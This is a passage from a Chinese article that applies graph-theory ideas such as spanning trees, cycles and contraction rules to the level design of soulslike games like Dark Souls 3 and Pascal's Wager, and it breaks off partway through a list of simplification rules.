data-original=\"https://pic2.zhimg.com/v2-35deda4ddc2044f8fc4cfcae2340df39_r.jpg\"><figcaption>伊瑟流姆自然逻辑图</figcaption></figure><p>到这里，其实我们已经可以开始“玩”这些绘制出来的结构图了，我们将这三幅图片并排放在一起。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8a6780aa2c88ccd9c18606e021c4ea77_b.jpg\" data-size=\"normal\" data-rawwidth=\"2721\" data-rawheight=\"625\" class=\"origin_image zh-lightbox-thumb\" width=\"2721\" data-original=\"https://pic4.zhimg.com/v2-8a6780aa2c88ccd9c18606e021c4ea77_r.jpg\"><figcaption>左中右三张地图，分别为恶鬼栖息之岛、幽邃教堂、伊瑟流姆</figcaption></figure><p>不知道读者是否有一种“直感”，就是这三幅地图的结构，看起来有那么一点点不太一样？仁王的地图，点与点之间看起来关系更“分散”一点，帕斯卡契约的则联系的比较“紧密”，而黑魂3的地图则联系的更加“紧密”——甚至有些路径必须交叠着才能画出(For Expert:非平面图)。这是正确的，在4.1节，我们会科普性的介绍图论当中的“连通度”概念，即可确定性的描述这种模糊的感受。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>关卡结构图中的最小生成树</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>那么，我们利用关卡当中的自然元素所构架的“自然逻辑图”已经画好了。作为一个实际的应用，我们不妨利用图论进行初步分析，看看能不能得到一些有趣的结果，顺便引入几个定义。</p>\n<p>1.顶(顶点，Vertex)</p>\n<p>由图中路径相交之处的点，称之为图的“顶”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7edcb8de76236a5447df702118d07f3c_b.jpg\" data-size=\"normal\" data-rawwidth=\"462\" data-rawheight=\"408\" class=\"origin_image zh-lightbox-thumb\" width=\"462\" data-original=\"https://pic1.zhimg.com/v2-7edcb8de76236a5447df702118d07f3c_r.jpg\"><figcaption>标注1，2，3，4的圆圈都是图的顶点</figcaption></figure><p>2.键(边，Bond/Edge)</p>\n<p>从顶点到顶点的一个对应关系(映射)，称之为“键”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6edc8e27cadaeef672825660b3bb09e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"328\" data-rawheight=\"429\" class=\"content_image\" width=\"328\"><figcaption>图的键，由红色粗体标出</figcaption></figure><p> 3.链</p>\n<p>由一系列顶和键交错构成的连续路径，称为“链”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-43ffe84726891d9563724294a3900309_b.jpg\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"293\" class=\"origin_image zh-lightbox-thumb\" width=\"752\" data-original=\"https://pic2.zhimg.com/v2-43ffe84726891d9563724294a3900309_r.jpg\"><figcaption>图中的一条链，由红色粗体标出</figcaption></figure><p>4.环路(圈，circle/loop)</p>\n<p>首尾重合且各顶相异的链，称之为“环”</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7e12425a51b2e186622c31d387907c46_b.jpg\" data-size=\"normal\" data-rawwidth=\"1162\" data-rawheight=\"536\" class=\"origin_image zh-lightbox-thumb\" width=\"1162\" data-original=\"https://pic3.zhimg.com/v2-7e12425a51b2e186622c31d387907c46_r.jpg\"><figcaption>一个简单的图，如左侧图片所示，利用三种颜色一共标出了三个环。右侧图所示的1-2-7-3-4-7-1不是环路，因为有重复的顶点7</figcaption></figure><p>5.子图</p>\n<p>对于一个图G，它的顶点构成集合{ <img src=\"https://www.zhihu.com/equation?tex=%7Bv_1%2C...%2Cv_n%7D\" alt=\"{v_1,...,v_n}\" eeimg=\"1\"> }，它的键构成集合{ <img src=\"https://www.zhihu.com/equation?tex=%7Be_1%2C...%2Ce_n%7D\" alt=\"{e_1,...,e_n}\" eeimg=\"1\"> }。若删去其中的一部分顶点和键，得到的新的图G'，我们称为图G的子图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c4ccbf3fe76c1e9ae39821d48f0ec3f6_b.jpg\" data-size=\"normal\" data-rawwidth=\"949\" data-rawheight=\"439\" class=\"origin_image zh-lightbox-thumb\" width=\"949\" data-original=\"https://pic3.zhimg.com/v2-c4ccbf3fe76c1e9ae39821d48f0ec3f6_r.jpg\"><figcaption>左侧为原图G，右侧为图$G$的子图G&amp;amp;amp;amp;amp;amp;amp;amp;amp;#39;</figcaption></figure><p>6.连通与连通图</p>\n<p>对于一张图G，取其中两顶 <img src=\"https://www.zhihu.com/equation?tex=u%2Cv\" alt=\"u,v\" eeimg=\"1\"> 。若图G中存在以 <img src=\"https://www.zhihu.com/equation?tex=u%2Cv\" alt=\"u,v\" eeimg=\"1\"> 为起点与终点的一条链，则称 <img src=\"https://www.zhihu.com/equation?tex=u%2Cv\" alt=\"u,v\" eeimg=\"1\"> 连通。</p>\n<p>若图G中任意两个顶均连通，则称图G为连通图</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ad5248e86e7b35e4d4c556f93d92aec3_b.jpg\" data-size=\"normal\" data-rawwidth=\"949\" data-rawheight=\"444\" class=\"origin_image zh-lightbox-thumb\" width=\"949\" data-original=\"https://pic4.zhimg.com/v2-ad5248e86e7b35e4d4c556f93d92aec3_r.jpg\"><figcaption>左侧图中，$u,v$之间存在$u-2-3-v$这样一条链，$u,v$两顶是连通的。左侧图中任意两个顶之间都存在链，因此左图是连通图。对于右侧的图，因为标红的$u,v$两顶之间不存在链，所以右图不是连通图</figcaption></figure><p>  7.最小生成树</p>\n<p>最小生成树就是该图的所有包含所有顶点的子图中键数最低的连通子图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c592209fec6c69704d41970433888726_b.jpg\" data-size=\"normal\" data-rawwidth=\"977\" data-rawheight=\"400\" class=\"origin_image zh-lightbox-thumb\" width=\"977\" data-original=\"https://pic3.zhimg.com/v2-c592209fec6c69704d41970433888726_r.jpg\"><figcaption>左图为原图G，右图为它的一个最小生成树</figcaption></figure><p>易证最小生成树有如下性质：</p>\n<ul>\n<li>最小生成树当中不存在环</li>\n<li>在最小生成树中添加一条边会构成环</li>\n</ul>\n<p>对于我们手中已有的“自然逻辑图”，一个自然的想法就是，通过依次找出环路，然后剔除环路中的某一根键，不断进行下去，就可以得到最小生成树了。主要的问题就显露出来：是哪一根键这么“幸运”，需要被剔除呢？或者，更细致一点的问——一个环路当中，哪根键最特殊，会被认为是用于“形成环路”(下简称“成环”)的键呢 ？这我们需要仔细分析四种键的作用。</p>\n<p><b>1.全连通路径</b></p>\n<p>两侧均连通的路径，最普通的双向路，很难想象有什么特殊之处。我们不认为任何一条全连通路会起到成环作用。</p>\n<p><b>2.单向门</b></p>\n<p>捷径，专为成环而生的键，构建起整个地图回溯式探索的主要结构组成。成环优先度最高。</p>\n<p><b>3.单向路</b></p>\n<p>单侧连通的路径。单向路通常以跳点的形式体现，部分是为了成环，部分是为了去往下一个区域。对此，我们不妨做这样的认定：当一个环路里，不存在单向门时，单向路才负责成环。也即单向路的成环优先度是第二位的。</p>\n<p><b>4.机关门</b></p>\n<p>通常意义上来讲，机关门是用于锁住新区域，而非在旧区域内成环，有很多极端的例子，甚至于打开机关门之后，只有一个藏有宝箱的小房间。但是例外依然是有的(《仁王》佐贺山的武士，某一面机关门)，因此，我们把机关门的成环优先度放在最末一位。</p>\n<p>这样，我们就可以安心的书写从自然逻辑图查找最小生成树的方案了。</p>\n<p><b>《关卡逻辑图最小生成树方案》</b></p>\n<p>对于任意环路：</p>\n<p>1.若该环路存在单向门，则将全部单向门置为空。</p>\n<p>2.若该环路不存在单向门，但存在一个或多个单向路，则统计所有单向路键，将被指向点的层级数(广度优先搜索，BFS意义上的“层级”)最低的那条单向路键置为空。</p>\n<p>3.若该环路既不存在单向门也不存在单向路，但存在一个或多个机关门，则统计所有机关门键，将被指向点的层级数最低的那条机关门键置为空。</p>\n<p>4.若该环路不存在任何特殊键，则将该环路缩并为一点。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>此时可能有读者要问了：“自然逻辑图的最小生成树有什么用呢？”</p>\n<p>作为例子，让我们看看黑魂3全游戏流程的自然逻辑图，并且将成环键标灰白色，使图结构成为最小生成树。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5e6b6e51e9702461f89d489d4d431351_b.jpg\" data-size=\"normal\" data-rawwidth=\"930\" data-rawheight=\"838\" class=\"origin_image zh-lightbox-thumb\" width=\"930\" data-original=\"https://pic2.zhimg.com/v2-5e6b6e51e9702461f89d489d4d431351_r.jpg\"><figcaption>魂3全游戏流程自然逻辑图与最小生成树(成环键被标成灰白色)</figcaption></figure><p>仔细观察可以发现，黑魂3的全地图流程的最小生成树，事实上有两条“枝”(For Expert:最长链和极长链)。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4a701fde4750311eb30ed64604115fd6_b.jpg\" data-size=\"normal\" data-rawwidth=\"1136\" data-rawheight=\"1056\" class=\"origin_image zh-lightbox-thumb\" width=\"1136\" data-original=\"https://pic3.zhimg.com/v2-4a701fde4750311eb30ed64604115fd6_r.jpg\"><figcaption>一条最长链(即整个生成树所含的路径最长的链)由蓝色曲线标出，另一条极长链(即生成树一条旁支区域中最长的链所含的路径最长的链)由红色曲线标出</figcaption></figure><p>第一条很长，从火祭场开始，经由洛城高墙、不死聚落、磔罚森林、法兰要塞、地下墓地、伊鲁席尔、亚诺尔隆德直到最深处的地下——罪业之都结束。</p>\n<p>另一条相对较短，起自火祭场，经过洛城高墙、洛城、进入妖王庭院截止。</p>\n<p>(以及后续的无火祭祀场，但是这个无火祭祀场比较复杂，所以没写。事实上，解包游戏的结果显示，无火祭祀场和传火祭祀场其实是同一张图，只不过从不同的位置进入时，加载的天空球和敌人配置会不一样。</p>\n<p>这两条路是什么呢？熟悉黑魂3的玩家可能很快就看出来了——这两条路分别对应两种设计师设计好的“游戏流程”。</p>\n<p>第一条路，从高墙出发，击杀Boss冰狗下到高墙下方探索，猎王回来之后，再回到小环旗老婆婆处，击杀Boss舞娘，登上洛城。这一路是标准的魂3普通玩家的游戏流程。</p>\n<p>另一条路，从高墙出发，直接击杀强力Boss舞娘，登上洛城。玩家只要能打过强力Boss舞娘，就可以在前期拿到后期的武器、装备、强化道具等。这一条路恰是留给高端玩家，速通黑魂3的流程。</p>\n<p>也就是说，一个关卡的“自然逻辑图的最小生成树”事实上反映了设计者的设计意图，即设计者对玩家游玩流程的把控程度。</p>\n<p>一个游戏、或者一张关卡，设计者留给玩家有几种游戏流程的选择，恰恰就蕴含在该图结构的最小生成树里。也就是说，从策划的视角来看，分析图结构的最小生成树，可以用于解析设计者的原本意图，快速写出的反推案。从玩家的视角，对于高端速通玩家或者想快速跑周目的普通玩家而言，列出图结构的最小生成树，也可以高效的帮助我们理顺游戏的必要流程，对于游戏攻略更加得心应手。</p>\n<p>类似的我们来分析帕斯卡的地图“伊瑟流姆”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-043ce5c1a5f866989f339b09d7f1621a_b.jpg\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"711\" class=\"origin_image zh-lightbox-thumb\" width=\"994\" data-original=\"https://pic3.zhimg.com/v2-043ce5c1a5f866989f339b09d7f1621a_r.jpg\"><figcaption>伊瑟流姆自然逻辑图与最小生成树(成环键被标成灰白色)</figcaption></figure><p>同样的，我们也把最小生成树的几条极长的“枝”画出来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-dbbf637ab9d900c627f90322238f966f_b.jpg\" data-size=\"normal\" data-rawwidth=\"1243\" data-rawheight=\"894\" class=\"origin_image zh-lightbox-thumb\" width=\"1243\" data-original=\"https://pic4.zhimg.com/v2-dbbf637ab9d900c627f90322238f966f_r.jpg\"><figcaption>一条最长链我们用蓝色曲线标出，另一条极长链用红色圆圈标出。三个黄色圆圈代表地图非主干路径当中形成的小环形结构。</figcaption></figure><p>可以看到，最长的枝(最长链)是放逐之径、水边塔二层、大树洞、教堂后门、教堂一层、水潭石山、遗物这一枝。这应该是设计者对玩家游玩流程的一个总体预规划。</p>\n<p>另一条极长链，从放逐之径到无头骑士，这条比较特殊。仔细观察，整个地图当中的四条捷径，竟然全都指向这个红色圆圈内的区域，恰恰说明，这个区域是整个地图的连接核心，一条“中轴”。</p>\n<p>此外，还有三条小的环路露出来的游离在外的键(For Expert:Dangling Bond，自由键)</p>\n<p>。三条分别是：水边塔和大树洞之间，设计者制作了一个小区域的分叉结构；从教堂后门爬上教堂二层，再二连跳进入教堂内部；水潭与石山附近，有一个小路通向卖不存在之靴(致没玩过帕斯卡契约的读者：一种跑图用的强力道具。)，再迅速回到主干道路上。</p>\n<p>由上述推断，我们得到伊瑟流姆的设计意图应该是这样的：以放逐之径——无头骑士一线作为桥接整个地图的主轴，水边塔、大树洞、教堂、水潭石山等主要探索区域为旁支，每个旁支区域探索结束的位置，设计捷径将他们连回主轴，构成回路。为了增加趣味性和探索的难度，设计者又增补了三处小环路，用于隐藏主干道路、放置强力宝物以及扩大开放式探索区域。</p>\n<p>以上就是笔者对于帕斯卡“伊瑟流姆”地图设计思路的一个试探性分析。我们直接去审视伊瑟流姆的原地图，它的几何结构也恰如我们所分析的那样。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b664658ec5e6ae8bb71cbcc35b19058e_b.jpg\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"1126\" class=\"origin_image zh-lightbox-thumb\" width=\"773\" data-original=\"https://pic3.zhimg.com/v2-b664658ec5e6ae8bb71cbcc35b19058e_r.jpg\"><figcaption>暗红色直线标出“放逐之径—无头骑士”一线的主要桥接成环道路；四个主要探索区域：水边塔、大树洞、教堂、水潭石山，“恰巧”落在一条绿色直线上。</figcaption></figure><p>可以明显的看到，水边塔、大树洞、教堂、水潭石山四个主要探索区域“恰巧”集中于一条绿色直线上——我们很难相信这不是来自于设计者精心构思的结果。</p>\n<p>而放逐之径——无头骑士一线是一条长的、双向连通的路径，我们用暗红色直线标出，几乎平行贯穿整条地图。四个右侧的探索区域，每个区域探索结束的位置都会尽量拉出一条捷径，与主轴放逐之径——无头骑士一线相连，构成闭合回路。与我们对最小生成树的分析结果不谋而合。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>最简逻辑图</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>本小节将是本文整套理论的最核心内容，这就是比关卡的“自然逻辑图”更进一步抽象的“最简逻辑图”的提出。</p>\n<p>“最简逻辑图”并非空中楼阁，而是我们在使用“自然逻辑图”的过程中遇到了问题，才会冒出改进“自然逻辑图”的想法。</p>\n<p>这个问题就是“自然逻辑图”的非唯一性。</p>\n<p>我简单的举个例子，对于如下图所示的一张地图局部，我们画出来的自然逻辑图应该是什么样呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8624e153664c7c6f9a7df792189bb425_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1391\" data-rawheight=\"522\" class=\"origin_image zh-lightbox-thumb\" width=\"1391\" data-original=\"https://pic2.zhimg.com/v2-8624e153664c7c6f9a7df792189bb425_r.jpg\"></figure><p>很遗憾的，随着我们选取POI的不同，这同样的空间几何结构，至少可以找出三种“自然逻辑图”的画法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8f1e223bd48cf8f097c0c1a045d2ea53_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1531\" data-rawheight=\"842\" class=\"origin_image zh-lightbox-thumb\" width=\"1531\" data-original=\"https://pic4.zhimg.com/v2-8f1e223bd48cf8f097c0c1a045d2ea53_r.jpg\"></figure><p>上述反例对于我们的理论来说，是巨大的缺陷。因为倘若同样的地图可以拥有不尽相同的图结构(For Expert:也就是讲，从几何空间到逻辑空间的双连续映射无法构成)，我们就无法进行定量的解析分析，那么找出类魂游戏关卡设计的一般规律就是无从谈起。</p>\n<p>为了解决这一问题，我们必须寻找一种“既约规则”——这种规则可以对已有的“自然逻辑图”进一步简化，得到更抽象的“最简逻辑图”。我们希望各个地图关卡的原图仅能对应一张最简逻辑图(For Expert:满射)。</p>\n<p>为了良好的定义这套化简的既约规则，我们需要再次引入新的概念：</p>\n<p>1.度(Degree)</p>\n<p>对于每个顶点，我们定义与之相关联的键的数目为该点的“度”或叫“度数”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-57daa92d616311345ebaea0f27a5a6cb_b.jpg\" data-size=\"normal\" data-rawwidth=\"420\" data-rawheight=\"429\" class=\"content_image\" width=\"420\"><figcaption>此图中所示的顶点3，它的度数为5，有五条键与之相连</figcaption></figure><p>2.极小环</p>\n<p>在平面图当中，极小环有着非常明确的几何意义——我们按照某一个固定的“手性”定则(譬如，我们知道，在走迷宫时，会有“左手定则”或“右手定则”，即遇见所有岔路口都固定向左手/右手方向转弯，最后一定可以走出迷宫)，绕着一张图一直走，直到回到原点。形成一条环路，这时候得到的环就是极小环。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-26120e66bebb846728c06e63f1497fc5_b.jpg\" data-size=\"normal\" data-rawwidth=\"872\" data-rawheight=\"425\" class=\"origin_image zh-lightbox-thumb\" width=\"872\" data-original=\"https://pic2.zhimg.com/v2-26120e66bebb846728c06e63f1497fc5_r.jpg\"><figcaption>图中如红色方框所示，有三条极小环</figcaption></figure><p>更一般的对于非平面图，有极小环定义：对于图G，取一组它的环结构的集合。我们要求该集合中所有环的顶点和键必须覆盖原图G的所有顶和键。若该集合中任意两环结构不相同，且相互独立。则称该集合中所有环结构为该图G的极小环。我们也称“极小环”为“基环”，即，拆解一个图结构的“基矢量”</p>\n<p>3.极大环</p>\n<p>对一张图G所有极小环做模2加法(什么叫模2加法呢？就是说，如果两个环叠加形成新的图。如果只有一个环有对应边，则画上对应边；如果两条边重合在一起，则该边变成空置状态。你也可以称之为“异或”加法，只有两个输入值相异的时候，结果为1。输入值相同则为0。)，此时得到的环结构称为图的极大环。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f27af2a69961fed52fd49c1128802e7c_b.jpg\" data-size=\"normal\" data-rawwidth=\"1052\" data-rawheight=\"246\" class=\"origin_image zh-lightbox-thumb\" width=\"1052\" data-original=\"https://pic1.zhimg.com/v2-f27af2a69961fed52fd49c1128802e7c_r.jpg\"><figcaption>图结构的异或加法示意图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53054700944048b327535cd67564026c_b.jpg\" data-size=\"normal\" data-rawwidth=\"871\" data-rawheight=\"439\" class=\"origin_image zh-lightbox-thumb\" width=\"871\" data-original=\"https://pic1.zhimg.com/v2-53054700944048b327535cd67564026c_r.jpg\"><figcaption>如图所示，红色的三个环为该图的极小环，蓝色的环(1-2-3-4-8-7-6-5-1)为该图的极大环</figcaption></figure><p>4.邻边</p>\n<p>两个极小环的公共键，我们称之为邻边</p>\n<p>5.不动点(Fixed-Point)</p>\n<p>无论如何绘制自然逻辑图，其个数都不会发生变化的顶。在分析类魂关卡时，就体现为初始点、存档点和Boss点。</p>\n<p>6.不动键</p>\n<p>无论如何绘制自然逻辑图，其个数都不会发生变化的键。在分析类魂关卡时，就体现为单向路、单向门和机关门。</p>\n<p>7.缩并(Contraction)</p>\n<p>将与同一顶相邻两相同键合并为同一键的操作，称为键的缩并。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7f8027eead3f120b496298a4c1c081c6_b.jpg\" data-size=\"normal\" data-rawwidth=\"1151\" data-rawheight=\"603\" class=\"origin_image zh-lightbox-thumb\" width=\"1151\" data-original=\"https://pic3.zhimg.com/v2-7f8027eead3f120b496298a4c1c081c6_r.jpg\"><figcaption>如图所示的操作称为对键的缩并</figcaption></figure><p>8.同伦(Homotopic)</p>\n<p>这个概念很重要——它就是我们从“自然逻辑图”变换到“最简逻辑图”时的数学表述。\\par</p>\n<p>定义：我们称两结构X和Y同伦，等价于当且仅当存在结构Z，该结构属于X、Y的一个公共子结构，且可以分别由X、Y在连续的形变收缩下得到。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-dc03f64789bbc24e4e18ba2e8b07c58d_b.jpg\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"393\" class=\"origin_image zh-lightbox-thumb\" width=\"863\" data-original=\"https://pic2.zhimg.com/v2-dc03f64789bbc24e4e18ba2e8b07c58d_r.jpg\"><figcaption>如图所示，X、Y均可以在连续形变下映射为他们的公共子结构Z。因此称X、Y同伦</figcaption></figure><p>9.同构(Isomorphism)</p>\n<p>这个概念也很重要，在图论中，只要一个线性变换T是可逆的，那么这个线性变换T就称之为同构变换</p>\n<p>简单意义上去理解，两个图同构，意味着两张图只是单纯的重命名(Rename)了顶，或者重排列(Rearrange)了键的位置，两张图本质上依然是同一张图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-df7b58c47f74496406ba5a1e1bed6602_b.jpg\" data-size=\"normal\" data-rawwidth=\"1688\" data-rawheight=\"1157\" class=\"origin_image zh-lightbox-thumb\" width=\"1688\" data-original=\"https://pic3.zhimg.com/v2-df7b58c47f74496406ba5a1e1bed6602_r.jpg\"><figcaption>如图所示，左侧和右侧的两个图结构是同构的，重命名并重排列各个顶之后，两张图本质上相同</figcaption></figure><p>10.无向图与有向图</p>\n<p>键为有方向的图称作有向图。键无法分辨方向性的图称作无向图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-fc1406963850136526f15267d08bbe37_b.jpg\" data-size=\"normal\" data-rawwidth=\"702\" data-rawheight=\"307\" class=\"origin_image zh-lightbox-thumb\" width=\"702\" data-original=\"https://pic4.zhimg.com/v2-fc1406963850136526f15267d08bbe37_r.jpg\"><figcaption>左侧为有向图，右侧为无向图</figcaption></figure><p>11.弱连通图与强连通图</p>\n<p>在有向图G中，如果两个顶点 <img src=\"https://www.zhihu.com/equation?tex=u%2Cv\" alt=\"u,v\" eeimg=\"1\"> 间存在一条<img src=\"https://www.zhihu.com/equation?tex=u%5Crightarrow+v\" alt=\"u\\rightarrow v\" eeimg=\"1\"> 的有向路径，和 <img src=\"https://www.zhihu.com/equation?tex=v%5Crightarrow+u\" alt=\"v\\rightarrow u\" eeimg=\"1\"> 的有向路径，则称两个顶点强连通(Strongly Connected)。如果有向图G的任两个顶点都强连通，称G是一个强连通图。</p>\n<p>将有向图的所有的有向边替换为无向边，若该图是连通图，则有向图是弱连通(Weakly Connected)的图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-e47be2d06f49a6fca5c5433a732df53f_b.jpg\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"351\" class=\"content_image\" width=\"394\"><figcaption>图中存在4—&amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;2的有向路径，但不存在2—&amp;amp;amp;amp;amp;amp;amp;amp;amp;gt;4的有向路径，因此不是强连通图。若将此图无向化，可以形成环结构，显然有该图为弱连通</figcaption></figure><p>12.n顶环</p>\n<p>一个具有n个顶的环路，称之为n顶环。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b9bbfb71dccf94b35637c49bc2834f4d_b.jpg\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"473\" class=\"origin_image zh-lightbox-thumb\" width=\"537\" data-original=\"https://pic2.zhimg.com/v2-b9bbfb71dccf94b35637c49bc2834f4d_r.jpg\"><figcaption>本图为5顶环</figcaption></figure><p> 13.自由键(Dangling Bond，悬空键）</p>\n<p>对于图中任一长链，其中除了首尾之外，其余顶点的度数为2，首尾任一点的度数为1，则称该长链上的任一条键为“自由键”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-3a6f900429997884dff15349cc6bab3a_b.jpg\" data-size=\"normal\" data-rawwidth=\"569\" data-rawheight=\"447\" class=\"origin_image zh-lightbox-thumb\" width=\"569\" data-original=\"https://pic3.zhimg.com/v2-3a6f900429997884dff15349cc6bab3a_r.jpg\"><figcaption>图中4-5-6这条链为自由键</figcaption></figure><p>  我们摆出的一张自然逻辑图，本图为《帕斯卡契约》的地图阿达米亚。不难发现，其实整张自然逻辑图里有许多“冗余”的全连通键。我们的最简逻辑图正是要删掉这些不构成环的键或者构成了全连通的“伪环”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-18ff06d8036630b16ad35b0d51bf2512_b.jpg\" data-size=\"normal\" data-rawwidth=\"1042\" data-rawheight=\"872\" class=\"origin_image zh-lightbox-thumb\" width=\"1042\" data-original=\"https://pic3.zhimg.com/v2-18ff06d8036630b16ad35b0d51bf2512_r.jpg\"><figcaption>冗余的全连通键用红色箭头指出</figcaption></figure><p>我们需要一个完备的缩并键的规则集合，为此，我们要再回溯性的讨论四种键的各种组合。</p>\n<p>首先<b>考虑我们的“成环”判据。</b>显然的，我们做出的自然逻辑图不是简单的无向图，甚至也不是简单的有向图——“捷径”这种线型结构，事实上在整个图论中就没出现过，但不妨我们类比着去研究。作为一种合理的近似，我们在判断一个回路结构是否“成环”的时候，不妨只讨论弱连通性下的成环，不要求强连通性的成环。</p>\n<p>这种近似的，我们试图在谈论的是一张地图的整体结构。对于设计者来讲，是一种“顶层设计”；对于玩家来讲，仅当地图探索完成之后，整张地图的结构才在玩家的脑海里建构起来。捷径这种结构显然是有向的，但在地图探索结束、全部捷径被开启之后，这种有向就变成了无向。正因为如此，我们认为在探讨地图探索结束时才能完整显露的关卡结构时，只考虑弱连通性成环是合理的。</p>\n<p>接下来看<b>我们对环结构顶点的要求。</b>一个成环的结构至少需要几个顶？答案似乎是三个，因为平面上最简单的多边形是三角形，它具有三个顶。</p>\n<p>但事实上，两顶环和单顶环也是可以存在的，只不过比较少见——在地图当中，他们大多以藏于主路径边缘的小宝箱、小宝物或其他奖励性的收集要素的形式出现，一个合理的理解是，他们并不会参与主路径的成环构建。所以，我们的主目标还是要尽量将一张图里所有的极小环向三顶环那个方向去缩并。</p>\n<p>另一方面，<b>我们必须禁止两顶环，但是可以允许单顶环少量存在。</b>——可能有人不好理解，为什么三顶以上都能允许，单顶也被允许，偏偏两顶就被pass了？这个是因为两顶环会导致一个很离谱的问题。假设点A与点B形成一个两顶环，那么从A到B的关系会有两种(For Export:这是一个双射，在我们写图结构的邻接矩阵时，A、B两点间关系对应的矩阵元同时存在两个数值，就没办法研究了。)无论是三顶以上的环，还是单顶环，任两个相邻点之间的关系都是唯一的(单顶环可以理解为A——A的一个连接，相当于自己映射自己)</p>\n<p>这就是我们必须禁止两顶环的理由。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0ef8a4b7710be8744bc9038e0819e0c1_b.jpg\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"194\" class=\"content_image\" width=\"300\"><figcaption>2顶环图例</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-86d4d38e9debf1cec4810b402c4ac059_b.jpg\" data-size=\"normal\" data-rawwidth=\"152\" data-rawheight=\"159\" class=\"content_image\" width=\"152\"><figcaption>单顶环图例</figcaption></figure><p>总结一下，我们的策略为<b>“尽量三顶环，禁止两顶环，允许单顶环”</b>，这是我们对最简逻辑图成环结构的顶数的要求。</p>\n<p>下面我们考虑对键的性质的要求，全连通键肯定是尽量全部缩并掉，因为全连通键对成环只起到辅助作用，真正的成环一定要看不动键。</p>\n<p>对于不动键，其实部分不动键依然有所冗余。譬如某条极小环里有多条单向路，这说明我们是连续多次跳悬崖到达了某个地方，尽管有多条单向路，但只有最后一条才实际起到了成环的作用。我们不妨将连续多条的同类型同向的单向路缩并为一条单向路，这样可以大大简化结构。</p>\n<p>最后<b>我们再分析一下自由键的问题。</b>自由键的表述为：一长链，其中除了首尾之外，其余顶点的度数为2，首尾任一点的度数为1，则称该长链上的任一条键为“自由键”。</p>\n<p>这样的结构显然是不能成环的。它在地图中，往往以：通向Boss的道路；探索途中的宝箱或特殊道具；特殊的NPC支线任务等形式出现。</p>\n<p>既然已经确定了这些建都无法参与成环，为了分析的简洁性，不妨将这些键全部缩并掉。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>最简缩并既约规则</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>1.</b>考虑成环与否时，只讨论弱连通性下的成环判据。</p>\n<p><b>2.</b>若对某条键进行缩并会使得图结构中出现2顶环，则该操作不允许被执行</p>\n<p><b>3.</b>对于任意键两顶点的缩并，普通点与普通点缩并时，任取两者任一的名称为标识；不动点与普通点缩并时，将缩并后的点标识为不动点；不动点与不动点之间不可缩并。</p>\n<p><b>4.</b>检查自然逻辑图的全部键，若存在某顶点度数为1的键，则将该顶点与另一顶点缩并为同一点。标识规则如规则3。如此迭代，直到图结构中不存在度数为1的顶。</p>\n<p><b>5.</b>对任意极小环 <img src=\"https://www.zhihu.com/equation?tex=C_0\" alt=\"C_0\" eeimg=\"1\"> ，考察与 <img src=\"https://www.zhihu.com/equation?tex=C_0\" alt=\"C_0\" eeimg=\"1\"> 具有邻边的极大环和其他极小环 <img src=\"https://www.zhihu.com/equation?tex=C_1+%5Csim+C_n\" alt=\"C_1 \\sim C_n\" eeimg=\"1\"> ，若 <img src=\"https://www.zhihu.com/equation?tex=C_i\" alt=\"C_i\" eeimg=\"1\"> 与 <img src=\"https://www.zhihu.com/equation?tex=C_0\" alt=\"C_0\" eeimg=\"1\"> 的邻边数目大于1，则</p>\n<p>       